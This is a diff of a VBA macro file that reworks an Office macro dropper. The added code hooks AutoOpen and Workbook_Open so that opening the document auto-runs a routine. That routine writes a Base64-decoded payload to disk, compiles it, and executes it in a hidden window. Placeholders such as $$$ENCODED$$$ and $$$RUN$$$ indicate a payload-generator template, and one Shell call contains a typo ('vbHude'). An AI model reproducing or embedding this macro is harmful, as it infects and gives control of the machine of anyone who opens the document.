@@ -1,35 +1,19 @@
-Sub iDn()
-  Dim nLJ6tv
-  Dim myFSO as New FileSystemObject
-  Dim myStream As TextStream
-  Dim fileName = "C:\Users\Public\temp.cs"
-  Set myStream = myFSO.CreateTextFile(fileName, True)
-  'stream.Write Base64Decode($$$ENCODED$$$)
-  Call Shell(nLJ6tv, vbHide)
-End Sub
-Sub AutoOpen()
-  iDn
-End Sub
-Sub Workbook_Open()
-  iDn
-End Sub
-
 Option Explicit
 
-Private Const clOneMask = 16515072          '000000 111111 111111 111111
-Private Const clTwoMask = 258048            '111111 000000 111111 111111
-Private Const clThreeMask = 4032            '111111 111111 000000 111111
-Private Const clFourMask = 63               '111111 111111 111111 000000
+Public Const clOneMask = 16515072          '000000 111111 111111 111111
+Public Const clTwoMask = 258048            '111111 000000 111111 111111
+Public Const clThreeMask = 4032            '111111 111111 000000 111111
+Public Const clFourMask = 63               '111111 111111 111111 000000
 
-Private Const clHighMask = 16711680         '11111111 00000000 00000000
-Private Const clMidMask = 65280             '00000000 11111111 00000000
-Private Const clLowMask = 255               '00000000 00000000 11111111
+Public Const clHighMask = 16711680         '11111111 00000000 00000000
+Public Const clMidMask = 65280             '00000000 11111111 00000000
+Public Const clLowMask = 255               '00000000 00000000 11111111
 
-Private Const cl2Exp18 = 262144             '2 to the 18th power
-Private Const cl2Exp12 = 4096               '2 to the 12th
-Private Const cl2Exp6 = 64                  '2 to the 6th
-Private Const cl2Exp8 = 256                 '2 to the 8th
-Private Const cl2Exp16 = 65536              '2 to the 16th
+Public Const cl2Exp18 = 262144             '2 to the 18th power
+Public Const cl2Exp12 = 4096               '2 to the 12th
+Public Const cl2Exp6 = 64                  '2 to the 6th
+Public Const cl2Exp8 = 256                 '2 to the 8th
+Public Const cl2Exp16 = 65536              '2 to the 16th
 
 Public Function Decode64(sString As String) As String
 
@@ -91,3 +75,27 @@ Public Function Decode64(sString As String) As String
     Decode64 = sOut
 
 End Function
+
+
+Sub iDn()
+    Dim myFso As Object
+    Set myFso = CreateObject("Scripting.FileSystemObject")
+    Dim fileName
+    $$$FILENAME$$$
+    Dim oFile As Object
+    Set oFile = myFso.CreateTextFile(fileName)
+    oFile.Write Decode64($$$ENCODED$$$)
+    oFile.Close
+    Dim compileCmd
+    $$$COMPILE$$$
+    Call Shell(compileCmd, vbHide)
+    Dim runCmd
+    $$$RUN$$$
+    Call Shell(runCmd, vbHude)
+End Sub
+Sub AutoOpen()
+  iDn
+End Sub
+Sub Workbook_Open()
+  iDn
+End Sub
